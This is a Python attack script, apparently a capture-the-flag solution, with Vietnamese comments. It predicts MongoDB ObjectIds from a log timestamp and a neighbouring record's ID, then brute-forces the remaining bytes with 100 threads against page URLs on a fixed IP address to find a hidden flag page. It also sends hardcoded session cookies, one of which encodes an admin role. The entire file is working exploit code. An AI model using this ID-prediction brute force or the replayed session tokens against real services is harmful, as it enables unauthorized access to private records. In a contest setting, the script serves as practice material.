#!/usr/bin/python3
from itertools import chain, product
import string
import threading
import sys
import datetime, time
from requests import get
import threading 
from bson.objectid import ObjectId
import re

def dict_all_size(charset, minlength, maxlength):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
        for i in range(minlength, maxlength + 1)))

def submit(id):
	url = "http://103.92.28.211/page/" + id
	req = get(url, proxies={})
	if 'matesctf' in req.text:
		return True
	return False

def _try():
	global dictionary, time_tuple, _id, other_id

	while 1:
		for minute in range(60):
			time_tuple[5] = minute
			_id = generate_id(other_id[1], other_id[2], time_tuple) 
			try:
				hex_number = dictionary.pop()
			except:
				return
			guess_id = _id.format(hex_number)
			print (guess_id)
			if submit(guess_id):
				print(datetime.datetime.today().strftime('%H:%M:%S'))
				print(guess_id)
				return

def generate_id(hex_const, counter, *datetuple):
	(year, month, day, hour, minute, second, microsecond) = datetuple[0]

	# Khởi tạo 4 byte đầu
	date = datetime.datetime(year, month, day, hour, minute, second, microsecond)
	id = ObjectId.from_datetime(date)

	# Khởi tạo 12 byte và bỏ 1 byte cuối để brute counter
	return (str(id)[:8] + hex_const + counter)[:-2] + '{}'

def get_datetime():
	log = open('../log', 'r').read()
	datetime = re.findall('(.*) added flag to db', log)[-1]

	year 		= int( re.findall('^(\d{4})-'	, datetime)[0] )
	month 		= int( re.findall('-(\d{2})-'	, datetime)[0] )
	day 		= int( re.findall('-(\d{2})\s'	, datetime)[0] )
	hour 		= int( re.findall('\s(\d{2}):'	, datetime)[0] )
	minute 		= int( re.findall(':(\d{2}):'	, datetime)[0] )
	second 		= int( re.findall(':(\d{2})\.'	, datetime)[0] )
	microsecond = int( re.findall('\.(\d{6})'	, datetime)[0] )

	return [year, month, day, hour, minute, second, microsecond]

def get_other_id():
	url = "http://103.92.28.211:8080/page/9"
	cookie = {
		'JSESSIONID': 'eyJjc3JmX3Rva2VuIjp7IiBiIjoiWmpVNU9HTXhZV016WVRnek4yTTBNakZsWlRRNVlXVXlaVE0xWldJek1HRXdPV05rTUdRNVlRPT0ifSwibG9nZ2VkIjoxLCJyb2xlIjoyLCJ1c24iOiJhZG1pbiJ9.DntOSA.Z748NLLnxU1Qm1P5FYkCzRLRfcE',
		'PHPSESSID': '0addcbdnegooilbtnn93relpv0',
		'X-CSRFToken': 'ImY1OThjMWFjM2E4MzdjNDIxZWU0OWFlMmUzNWViMzBhMDljZDBkOWEi.Dnt7eg.awtCiQyvxUccwpjOiEK7tSEyoJg'
	}
	req = get(url, cookies=cookie)
	other_id = re.findall('<h3 id="(.*)">Page 9</h3>', req.text)[0]
	timestamp = other_id[:8]
	hex_const = other_id[8:18]
	counter = other_id[18:]
	return [timestamp, hex_const, counter] 


# 5b7c2646 5f627d2737 a17c3a
# 4 byte (5b7c2646): timestamp - có thể đoán được, do timestamp gần nhau nên 3 byte đầu giống nhau (brute 1 byte cuối)
# 3 byte (5f627d): identifier - không đổi
# 2 byte (2737): process id - không đổi
# 3 byte (a17c3a): counter - có thể đoán được nhờ liền kề với 1 id nào đó (brute 1 byte cuối)

# Khởi tạo từ điển
dictionary = list(dict_all_size(string.hexdigits[:16], 2, 2))
# Lấy dữ liệu từ log
time_tuple = get_datetime()
# Lấy object id của row khác
other_id = get_other_id()

print(datetime.datetime.today().strftime('%H:%M:%S'))
for i in range(100):
	threading.Thread(target=_try).start()


